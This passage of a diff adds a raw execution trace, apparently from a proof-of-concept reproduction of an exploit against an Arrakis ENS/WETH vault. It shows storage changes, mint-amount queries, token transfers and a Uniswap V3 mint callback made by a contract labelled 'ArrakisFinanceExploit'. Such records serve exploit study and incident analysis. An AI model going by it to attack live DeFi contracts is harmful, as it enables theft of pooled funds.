+    │   │   │   │   │   @ 0x3f11420a9b4b2bc04523fd4836da0c818b52d5ca1c0563ea905361bf920dfa24: 0x00000000000000000000000000000000056ea7badbe25735d42cc9953a978e83 → 0x000000000000000000000000000000000968d0abca0b6b803b191285bde37b8d
+    │   │   │   │   │   @ 0x87590fd0268934902903d81015470225db8c3ee6fd42e33f79e6fc50f7e3c450: 0x000000000000000000000000000000009299541137f9452cbd6065cc60f3b4af → 0x00000000000000000000000000000007f9a8f64bbba5db62450402b0a7f51df5
+    │   │   │   │   │   @ 0x4f627853b62661dfad292d157bc0b937c9358827fa3ac615511d3b09e83c2908: 0x000000000000000000000000000000034cb5ad365c425e3e5c373e1e5a78c46a → 0x000000000000000000000000000000053f8c9d26975cc250a62d2a5eae700e3a
+    │   │   │   │   │   @ 0xd5f5be7ef82d3e3c7f046a766e3a551b834a259ca2c1f43fba80f0e3cfa1c79e: 0x000000000000000000000000000000000de829f4800f6f8f3744ce9e8236357b → 0x0000000000000000000000000000000000bda330de7377925f63e79a71e638d7
+    │   │   │   │   │   @ 0x2979857faf937b741547f2153f9684b5b8e6f461f39a8959920ee8f2deff2d2f: 0x000000000000000000000000000000000e8a572f1bf96a0a4ca85f306fae8fda → 0x000000000000000000000000000000000011d9dc9035d4811bd5ae693d9650e5
+    │   │   │   │   │   @ 0x2672d6e2bdaba87886263d564a2e18bb52c4b294919033b5ff7e6aad6bf66c4d: 0x01618dab8900001b260000000000000948934fced00829204300000291588c1f → 0x0108fd40ee0000000000000000002dec6c17fef43cb929958900070000fb8eb7
+    │   │   │   │   │   @ 0x23192d3344ba125435847795d42ea16808782ce940b3eccf623e6bbf34474577: 0x000000000000000000000000000000034307b853b7269b2d05d3ff6983d65b2f → 0x00000000000000000000000000000005493a92093c788561fc90691385127775
+    │   │   │   │   │   @ 0x2672d6e2bdaba87886263d564a2e18bb52c4b294919033b5ff7e6aad6bf66c4c: 0x0000000000000000000000000000000326c9496b3be00789179ec5706b482121 → 0x00000000000000000000000000000005657900f1b7bf1905eac5a30c9da0b183
+    │   │   │   │   │   @ 0x9434008338d50d53afb547bcb7ad09fa6652357cb64168ca095b6d0b6ab332c6: 0x016903aa3f00001b2600000000001b9f9bf81e2a4d3a8836a40005a632b14e66 → 0x0101874238000000000000000000125618b33098bf86ca7f2800015c5fa2cc70
+    │   │   │   │   │   @ 0xd5f5be7ef82d3e3c7f046a766e3a551b834a259ca2c1f43fba80f0e3cfa1c7a0: 0x01686525cd00001b2600000000001817c6702c8e77fe7d5ad8000521ffc991a5 → 0x010225c6aa00000000000000000015ddee3b223494c2d55af40001e0928a8931
+    │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707c: 0x00000000000000000000000000000006a642b59e551461705690ea9363c89790 → 0x00000000000000000000000000000001e5ff94be9e8abf1eabd37de9a5203b14
+    │   │   │   │   │   @ 0xe8d8f735cf87d0e9059bdccbbf5cdc13ef80f19de2bd94b113a0c30bc4e68ea9: 0x000000000000000000000000000000000c3458bbf55472e30ca66aac03a510d3 → 0x000000000000000000000000000000000278c45629c492fb4ba6954aac3fb90d
+    │   │   │   │   │   @ 0x23192d3344ba125435847795d42ea16808782ce940b3eccf623e6bbf34474578: 0x01618a15f500001b2600000000000007fc9b83465728c2c59d0000006578a090 → 0x010900d6820000000000000000002dedb80fcb7cb5988ff02f0007022cdb7a46
+    │   │   │   │   │   @ 0x36b78b16f757214c7748592660e96b36003e9abd4febd182d5579bca5cccf2e7: 0x016459dddb00001b26000000000005636c2fb369af0c46b5b400020f62adc176 → 0x0106310e9c0000000000000000002892487b9b595db50c00180004f32fa65960
+    │   │   │   │   │   @ 0xc0f945f00d11313808259f41de695cc2dfd179411012a6ace77a26aa476c0564: 0x00000000000000000000000000000006ea11081eacae228f1525274de25bb26e → 0x00000000000000000000000000000001a231423e46f0fdffed3f412f268d2036
+    │   │   │   │   │   @ 0xbb1b5c06eb74cba985bfd93adfd96780fae7897045fb9a86f836474a666f5c21: 0x000000000000000000000000000000000cefa3db680e42de251c418f63f270cc → 0x0000000000000000000000000000000001bc295e9b99e7e739b679e61f6a7915
+    │   │   │   │   │   @ 0xc0f945f00d11313808259f41de695cc2dfd179411012a6ace77a26aa476c0563: 0x000000000000000000000000000000000cea711a3f8fd0d09e1b9c1d8fdc2d2c → 0x0000000000000000000000000000000001bf424b6b90cda4e2602e426b8be894
+    │   │   │   │   │   @ 0x23192d3344ba125435847795d42ea16808782ce940b3eccf623e6bbf34474576: 0x00000000000000000000000000000000042f32aedc62148725d7ebd2966cbfdc → 0x000000000000000000000000000000000a9f3c917f6a3bb8ba3a9b1936c7c3bf
+    │   │   │   │   │   @ 0x0d70f5f941b8f2971a279604d75022147da282e1ca49a9fc834c22d023c3a0dd: 0x016189d44600001b2600000000000007f1e9abd26c246a8e3c00000032be1da2 → 0x01090118310000000000000000002dedc2c1a2f0a09ce827900007025f95fd34
+    │   │   │   │   │   @ 0x36b78b16f757214c7748592660e96b36003e9abd4febd182d5579bca5cccf2e5: 0x000000000000000000000000000000000af00f603b9f150590b373753390e6fd → 0x0000000000000000000000000000000003f8847b6050fc061b023047f1c3f97e
+    │   │   │   │   │   @ 0x1efa840f8a1b77fdb58378ec490dba7c94b7e4ce966a789e61f1027cfaacd404: 0x00000000000000000000000000000007b80ced38f6a225edbe3eb6ca84f3b7d8 → 0x00000000000000000000000000000000d4355d23fcfcfaa14425b1b283f51acc
+    │   │   │   │   │   @ 0x5bbae0ba0219464a687460280b79150b5d52e01b18ab85b4833842b5e27a6643: 0x0000000000000000000000000000000870939cc42b0b0c5f2e755eefef1b62b3 → 0x000000000000000000000000000000001baead98c894142fd3ef098d19cd6ff1
+    │   │   │   │   │   @ 68: 0x0100001b2600000000002d596718212b1610c0918f0006fea95305ca6a86bd77 → 0x0100001b2600000000002df5b4ab4ec30cc152b5cc00070292541ad66a8aec77
+    │   │   │   │   │   @ 4: 0x000000000000000000000000000000000000000000000006a426e9a464721017 → 0
+    │   │   │   │   │   @ 0x4ad9c24ad7fe45191dbd89bbd96b37a220d27049e5799aade9c4c16d861519ff: 0x000000000000000000000000000000000dcae7d08f2824b64bd80c40b279a02d → 0x0000000000000000000000000000000000dba513a9ca3d3264a22e6d1d578ff9
+    │   │   │   │   │   @ 1: 0x000000000000000000000000000000000e9bbccb186a8cd3c54cddef97f3e4db → 0x000000000000000000000000000000087d7b446e996ae47d83446f304b4893cb
+    │   │   │   │   │   @ 0x2672d6e2bdaba87886263d564a2e18bb52c4b294919033b5ff7e6aad6bf66c4b: 0x00000000000000000000000000000000043b2224a58be02fb104bf54f6788dfc → 0x000000000000000000000000000000000a8c9ce91c48846c575690818274d6ae
+    │   │   │   │   │   @ 0xbf116f8b6dc34ed638559da1fcf7d1e65e709484f551901881f65d207add0c0f: 0x000000000000000000000000000000000578e32afaf0984b273d30497008d983 → 0x00000000000000000000000000000000094d73dfaf566e65a444d38c7c0790ac
+    │   │   │   │   │   @ 0x40d66439f71349bebc2005ac22e96d690974dd0d1048b2a192c0d7fae6087296: 0x00000000000000000000000000000002db0e3bc50e4eed68cad40cb065f30a5c → 0x00000000000000000000000000000005b1340e97e550332637905bcca2f5c848
+    │   │   │   │   │   @ 0x9434008338d50d53afb547bcb7ad09fa6652357cb64168ca095b6d0b6ab332c4: 0x000000000000000000000000000000000e48023b2ef64d93577736e523537813 → 0x00000000000000000000000000000000005b4936d7f14342519fb1e133dd1b64
+    │   │   │   │   │   @ 0xfc6170dab3f5999689ffa458668d4024cdda4e00c34065ec8e3d53f323892fc9: 0x000000000000000000000000000000000de30884319450fed2f5cecda2316526 → 0x0000000000000000000000000000000000d500d88ac2afd562676bc92ecd79dd
+    │   │   │   │   │   @ 0x4f627853b62661dfad292d157bc0b937c9358827fa3ac615511d3b09e83c2907: 0x00000000000000000000000000000000044f46eb526bb5ac26901ba1258f40b7 → 0x000000000000000000000000000000000a7cdc653e83b3dd96d1c87360ed9b0c
+    │   │   │   │   │   @ 0xd5f5be7ef82d3e3c7f046a766e3a551b834a259ca2c1f43fba80f0e3cfa1c79f: 0x00000000000000000000000000000007b2d2882d6f94968d80ce648c0f5cb5b3 → 0x00000000000000000000000000000000d96fc22f840a8a01819603f0f98c1cf1
+    │   │   │   │   │   @ 0xc955c8552c52ebd49a57a58afc15a22c1415742cf1ff54074c7324a639374a87: 0x000000000000000000000000000000000bc538cd7cabefac022b83974df207c0 → 0x0000000000000000000000000000000002e8567947015f4d507b0af5c33882a8
+    │   │   │   │   │   @ 0xc955c8552c52ebd49a57a58afc15a22c1415742cf1ff54074c7324a639374a89: 0x016602957c00001b2600000000000cf2c615492dea8bef95dc00033b25cf1b0d → 0x01048856fb0000000000000000002102ee9605952235631ff00003c76c84ffc9
+    │   │   │   │   │   @ 0x40d66439f71349bebc2005ac22e96d690974dd0d1048b2a192c0d7fae6087297: 0x0163bef22700001b2600000000000484e419cf5689c3bbd20700018ba3abaa97 → 0x0106cbfa500000000000000000002970d0917f6c82fd96e3c5000576eea8703f
+    │   │   │   │   │   @ 0x6b918c1dbc325614d84d6c9444051d7bf2d78ee1ffdf105c85ea31f7bec4f486: 0x00000000000000000000000000000005d24977bddae51da1c9eb69ca574cfa90 → 0x00000000000000000000000000000002b9f8d29f18ba02ed3878feb2b19bd814
+    │   │   │   │   │   @ 0xfc6170dab3f5999689ffa458668d4024cdda4e00c34065ec8e3d53f323892fcb: 0x01679737ef00001b26000000000013d1bc20c1285a8f328552000494ee6fb8be → 0x0102f3b4880000000000000000001a23f88a8d9ab23220307a00026da3e46218
+    │   │   │   │   │   @ 0xbf116f8b6dc34ed638559da1fcf7d1e65e709484f551901881f65d207add0c11: 0x01618f1ee300001b26000000000000098279b98a68fb7ea3ce0000038f6467dc → 0x0108fbcd940000000000000000002dec32319538a3c5d411fe0006ff02efb2fa
+    │   │   │   │   │   @ 0x36b78b16f757214c7748592660e96b36003e9abd4febd182d5579bca5cccf2e6: 0x00000000000000000000000000000006238650c3bcbdf632f7ef185053fa970b → 0x0000000000000000000000000000000268bbf99936e12a5c0a75502cb4ee3b99
+    │   │   │   │   │   @ 0x1efa840f8a1b77fdb58378ec490dba7c94b7e4ce966a789e61f1027cfaacd405: 0x01675a7c9f00001b260000000000132f0d7312ab4cbb7da59900046aa706a096 → 0x0103306fd80000000000000000001ac6a7383c17c005d51033000297eb4d7a40
+    │   │   │   │   │   @ 0x6b918c1dbc325614d84d6c9444051d7bf2d78ee1ffdf105c85ea31f7bec4f487: 0x0164dc1f3700001b26000000000007bee8f99aaadefd79d06900025cf8314bae → 0x0105aecd400000000000000000002636cbb1b4182dc3d8e5630004a59a22cf28
+    │   │   │   │   │   @ 0xbb1b5c06eb74cba985bfd93adfd96780fae7897045fb9a86f836474a666f5c22: 0x00000000000000000000000000000006fa1c495f2002d932382c66f8d5f6cbca → 0x00000000000000000000000000000001922600fdd39c475cca38018432f206da
+    │   │   │   │   │   @ 0x0d70f5f941b8f2971a279604d75022147da282e1ca49a9fc834c22d023c3a0db: 0x0000000000000000000000000000000003cf740866d8d825760d0d7a55d55ba2 → 0x000000000000000000000000000000000b160e1a06f27f948c5ec6ff571f82c2
+    │   │   │   │   │   @ 0xc955c8552c52ebd49a57a58afc15a22c1415742cf1ff54074c7324a639374a88: 0x000000000000000000000000000000063240b146a072604d8be17d4511a9c299 → 0x000000000000000000000000000000025a019916532cc0417682eb37f73f100b
+    │   │   │   │   │   @ 0x3f11420a9b4b2bc04523fd4836da0c818b52d5ca1c0563ea905361bf920dfa25: 0x00000000000000000000000000000003bab860af8663e755e45bf740b1fccdeb → 0x00000000000000000000000000000004d189e9ad6d3b39391e08713c56ec04b9
+    │   │   │   │   │   @ 0xf9df731f082afbeaf806d7c4d8535acce408cfe9148148be41c341cff9a7707b: 0x000000000000000000000000000000000b997a2110684fbcc9011293eba3a019 → 0x000000000000000000000000000000000356a165ce6181ab8628ddfcdd225bad
+    │   │   │   │   │   @ 0x1efa840f8a1b77fdb58378ec490dba7c94b7e4ce966a789e61f1027cfaacd403: 0x000000000000000000000000000000000db2d1e58c9e8e828e6f226d953d42a0 → 0x00000000000000000000000000000000013c2deb5ff083bcae90164c6eb4fc7d
+    │   │   │   │   │   @ 0xbb1b5c06eb74cba985bfd93adfd96780fae7897045fb9a86f836474a666f5c23: 0x0166b4747000001b2600000000000f255649c1de2a702f93ba0003c5d953df10 → 0x0103d678070000000000000000001ed05e618ce4e25123221200033cb9003bc6
+    │   │   │   │   │   @ 0x4ad9c24ad7fe45191dbd89bbd96b37a220d27049e5799aade9c4c16d86151a00: 0x00000000000000000000000000000007994f7c47281498d0fc6e6c88a2fe9e73 → 0x00000000000000000000000000000000f2f2ce15cb8a87be05f5fbf465ea3431
+    │   │   │   │   │   @ 0xfc6170dab3f5999689ffa458668d4024cdda4e00c34065ec8e3d53f323892fca: 0x00000000000000000000000000000007ca3eceeed8a1b44eca913be412da032c → 0x00000000000000000000000000000000c2037b6e1afd6c4037d32c98f60ecf78
+    │   │   │   │   │   @ 0x4baf310dda4757b282ea0389c3312f448a78aa799fbf6818cb6e1ab24456fe83: 0x0169ff486b00001b260000000000233eccbff583fade16bd4b000682ad58fc22 → 0x01008ba40c0000000000000000000ab6e7eb593f11e33bf88100007fe4fb1eb4
+    │   │   │   │   │   @ 0x87590fd0268934902903d81015470225db8c3ee6fd42e33f79e6fc50f7e3c44f: 0x0000000000000000000000000000000000749c8ed6d98da968e66d3e9013f5be → 0x000000000000000000000000000000087d06a7dfc29156d41a5e01f1bb349e0d
+    │   │   │   │   │   @ 0xc0f945f00d11313808259f41de695cc2dfd179411012a6ace77a26aa476c0565: 0x0167096eb800001b2600000000001110e34185a38e25589f5d00040824237951 → 0x0103817dbf0000000000000000001ce4d169c91f7e9bfa166f0002fa6e30a185
+    │   │   │   │   │   @ 0x2979857faf937b741547f2153f9684b5b8e6f461f39a8959920ee8f2deff2d30: 0x000000000000000000000000000000086d1f960bfc126c2a9ebd6cd484ae1fb4 → 0x000000000000000000000000000000001f22b450f78cb46463a6fba8843ab2f0
+    │   │   │   │   │   @ 0: 0x00016600960096003b00ebad00000000000000146b8bd6f277abbfd51236a70d → 0x00016600960096003cfde427000000000000000000416961d8a4f4eb92d2794a
+    │   │   │   │   │   @ 0x4baf310dda4757b282ea0389c3312f448a78aa799fbf6818cb6e1ab24456fe81: 0x000000000000000000000000000000000e7dc880f8f8154e06a6a04167bc5716 → 0x000000000000000000000000000000000020b231c895662b0ef89e6a8a095756
+    │   │   │   │   │   @ 0x5bbae0ba0219464a687460280b79150b5d52e01b18ab85b4833842b5e27a6644: 0x016a4ea51300001b26000000000025dc4ff6f71885474c99610006ca7dab8d62 → 0x01003c4764000000000000000000081964b457aa877a061c6b00003814a88d74
+    │   │   │   │   │   @ 0x0d70f5f941b8f2971a279604d75022147da282e1ca49a9fc834c22d023c3a0dc: 0x00000000000000000000000000000003082dc5cefb29b0432ffe8bfe093296a4 → 0x000000000000000000000000000000058414848df875704bd265dc7effb63c00
+    │   │   │   │   │   @ 3: 0x00000000000000001361f9270c59b03c000000000000000000000dff84270ea9 → 0x00000000000000001361f9270c59b03c0000000000000000035d1898337280e7
+    │   │   │   │   │   @ 0x4baf310dda4757b282ea0389c3312f448a78aa799fbf6818cb6e1ab24456fe82: 0x0000000000000000000000000000000859bb2b72b5f8337fba5848a6e84f31a4 → 0x0000000000000000000000000000000032871eea3da6ed0f480c1fd62099a100
+    │   │   │   │   │   @ 0x4f627853b62661dfad292d157bc0b937c9358827fa3ac615511d3b09e83c2909: 0x01618a9a1900001b26000000000000081f09850c43b9abc9fe000000be97dbb5 → 0x010900525e0000000000000000002ded95a1c9b6c907a6ebce000701d3bc3f21
+    │   │   │   │   └─ ← [Return] 145416963504083295148 [1.454e20], -13292512773372132065449 [-1.329e22]
+    │   │   │   ├─ [974] ENS::balanceOf(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 13292512773372132065449 [1.329e22]
+    │   │   │   ├─ [534] WETH::balanceOf(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1654583036495916704852 [1.654e21]
+    │   │   │   ├─ [65862] G-UNI ENS-WETH vault::getMintAmounts(1654583036495916704852 [1.654e21], 13159587645638410744795 [1.315e22]) [staticcall]
+    │   │   │   │   ├─ [60843] ArrakisVaultV1::getMintAmounts(1654583036495916704852 [1.654e21], 13159587645638410744795 [1.315e22]) [delegatecall]
+    │   │   │   │   │   ├─ [696] Uni V3 ENS/WETH::slot0() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 79077831700698859920587082 [7.907e25], -138201 [-1.382e5], 60, 150, 150, 102, true
+    │   │   │   │   │   ├─ [9013] Uni V3 ENS/WETH::positions(0xbcac4ba2b61cea3374434cac46e9397785cdcac027e73f115c3ade69eaba970b) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e1530000000000000000000000000000000002d9f3f668281bdacc81edd287e2e71300000000000000000000000000000001a6aaf188f19bc6a5223b675307d5c8cc00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [364] Uni V3 ENS/WETH::feeGrowthGlobal0X128() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000087d7b446e996ae47d83446f304b4893cb
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(32000 [3.2e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e15300000000000000000000000000000000000000000000001de3da891437a4e153000000000000000000000000000000000356a165ce6181ab8628ddfcdd225bad00000000000000000000000000000001e5ff94be9e8abf1eabd37de9a5203b14000000000000000000000000000000000000000000000000000003eacb866104000000000000000000000000000000000000000000223d69dcd14e0c6d2423660000000000000000000000000000000000000000000000000000000004ee09880000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(60000 [6e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e153ffffffffffffffffffffffffffffffffffffffffffffffe21c2576ebc85b1ead000000000000000000000000000000000011d9dc9035d4811bd5ae693d9650e5000000000000000000000000000000001f22b450f78cb46463a6fba8843ab2f00000000000000000000000000000000000000000000000000000003d5decbcdc00000000000000000000000000000000000000000008c4184cf713a81672f2580000000000000000000000000000000000000000000000000000000000420a980000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [388] Uni V3 ENS/WETH::feeGrowthGlobal1X128() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000088c424a5cf39f208f0264687d08e8d2a4
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(32000 [3.2e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e15300000000000000000000000000000000000000000000001de3da891437a4e153000000000000000000000000000000000356a165ce6181ab8628ddfcdd225bad00000000000000000000000000000001e5ff94be9e8abf1eabd37de9a5203b14000000000000000000000000000000000000000000000000000003eacb866104000000000000000000000000000000000000000000223d69dcd14e0c6d2423660000000000000000000000000000000000000000000000000000000004ee09880000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(60000 [6e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e153ffffffffffffffffffffffffffffffffffffffffffffffe21c2576ebc85b1ead000000000000000000000000000000000011d9dc9035d4811bd5ae693d9650e5000000000000000000000000000000001f22b450f78cb46463a6fba8843ab2f00000000000000000000000000000000000000000000000000000003d5decbcdc00000000000000000000000000000000000000000008c4184cf713a81672f2580000000000000000000000000000000000000000000000000000000000420a980000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6233955217024577008 [6.233e18]
+    │   │   │   │   │   ├─ [2974] ENS::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 924325242674023187320 [9.243e20]
+    │   │   │   │   │   └─ ← [Return] 1253394683838271695411 [1.253e21], 13159587645638410744793 [1.315e22], 4486619135659964587643 [4.486e21]
+    │   │   │   │   └─ ← [Return] 1253394683838271695411 [1.253e21], 13159587645638410744793 [1.315e22], 4486619135659964587643 [4.486e21]
+    │   │   │   ├─ [156320] G-UNI ENS-WETH vault::mint(4486619135659964587643 [4.486e21], ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─ [155801] ArrakisVaultV1::mint(4486619135659964587643 [4.486e21], ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   ├─ [696] Uni V3 ENS/WETH::slot0() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 79077831700698859920587082 [7.907e25], -138201 [-1.382e5], 60, 150, 150, 102, true
+    │   │   │   │   │   ├─ [696] Uni V3 ENS/WETH::slot0() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 79077831700698859920587082 [7.907e25], -138201 [-1.382e5], 60, 150, 150, 102, true
+    │   │   │   │   │   ├─ [1013] Uni V3 ENS/WETH::positions(0xbcac4ba2b61cea3374434cac46e9397785cdcac027e73f115c3ade69eaba970b) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e1530000000000000000000000000000000002d9f3f668281bdacc81edd287e2e71300000000000000000000000000000001a6aaf188f19bc6a5223b675307d5c8cc00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [364] Uni V3 ENS/WETH::feeGrowthGlobal0X128() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000087d7b446e996ae47d83446f304b4893cb
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(32000 [3.2e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e15300000000000000000000000000000000000000000000001de3da891437a4e153000000000000000000000000000000000356a165ce6181ab8628ddfcdd225bad00000000000000000000000000000001e5ff94be9e8abf1eabd37de9a5203b14000000000000000000000000000000000000000000000000000003eacb866104000000000000000000000000000000000000000000223d69dcd14e0c6d2423660000000000000000000000000000000000000000000000000000000004ee09880000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(60000 [6e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e153ffffffffffffffffffffffffffffffffffffffffffffffe21c2576ebc85b1ead000000000000000000000000000000000011d9dc9035d4811bd5ae693d9650e5000000000000000000000000000000001f22b450f78cb46463a6fba8843ab2f00000000000000000000000000000000000000000000000000000003d5decbcdc00000000000000000000000000000000000000000008c4184cf713a81672f2580000000000000000000000000000000000000000000000000000000000420a980000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [388] Uni V3 ENS/WETH::feeGrowthGlobal1X128() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000088c424a5cf39f208f0264687d08e8d2a4
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(32000 [3.2e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e15300000000000000000000000000000000000000000000001de3da891437a4e153000000000000000000000000000000000356a165ce6181ab8628ddfcdd225bad00000000000000000000000000000001e5ff94be9e8abf1eabd37de9a5203b14000000000000000000000000000000000000000000000000000003eacb866104000000000000000000000000000000000000000000223d69dcd14e0c6d2423660000000000000000000000000000000000000000000000000000000004ee09880000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [1199] Uni V3 ENS/WETH::ticks(60000 [6e4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001de3da891437a4e153ffffffffffffffffffffffffffffffffffffffffffffffe21c2576ebc85b1ead000000000000000000000000000000000011d9dc9035d4811bd5ae693d9650e5000000000000000000000000000000001f22b450f78cb46463a6fba8843ab2f00000000000000000000000000000000000000000000000000000003d5decbcdc00000000000000000000000000000000000000000008c4184cf713a81672f2580000000000000000000000000000000000000000000000000000000000420a980000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6233955217024577008 [6.233e18]
+    │   │   │   │   │   ├─ [974] ENS::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 924325242674023187320 [9.243e20]
+    │   │   │   │   │   ├─ [6225] WETH::transferFrom(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 1253394683838271695411 [1.253e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 1253394683838271695411 [1.253e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000059b1f3c9561e4c2454 → 0x000000000000000000000000000000000000000000000015bf9b5927b7127a21
+    │   │   │   │   │   │   │   @ 0x0815d0dd6fffb6fb9240b9a8fd7860b9bb0a0bc2408437858e902ce9b0b82194: 0x0000000000000000000000000000000000000000000000005683753db0716df0 → 0x00000000000000000000000000000000000000000000004448dbe56c17ab1823
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [12462] ENS::transferFrom(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 13159587645638410744793 [1.315e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 13159587645638410744793 [1.315e22])
+    │   │   │   │   │   │   ├─ emit Approval(owner: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], amount: 115792089237316195423570985008687907853269984665640564026297996362274718895142 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xb25084536dfcbcb838cfff9b6adef016b685b73e4ac00a19fa53c7f564e9738a: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffd369e08f6c67f7c4c26
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000002d096abf4a1846600a9 → 0x00000000000000000000000000000000000000000000000734b4eb6803e24cd0
+    │   │   │   │   │   │   │   @ 0xe93aa2f82a8a8f01568738253bc6975ae9687498604a90aff5dbd53f42b78447: 0x0000000000000000000000000000000000000000000000321b96eeed4fe34378 → 0x0000000000000000000000000000000000000000000002fb7d8df826d066f751
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [60628] Uni V3 ENS/WETH::mint(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe], 32000 [3.2e4], 60000 [6e4], 8239613915896373616875 [8.239e21], 0x)
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 155339866841105595974 [1.553e20]
+    │   │   │   │   │   │   ├─ [6974] G-UNI ENS-WETH vault::uniswapV3MintCallback(1253394683838271695411 [1.253e21], 0, 0x)
+    │   │   │   │   │   │   │   ├─ [6452] ArrakisVaultV1::uniswapV3MintCallback(1253394683838271695411 [1.253e21], 0, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [3262] WETH::transfer(Uni V3 ENS/WETH: [0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3], 1253394683838271695411 [1.253e21])
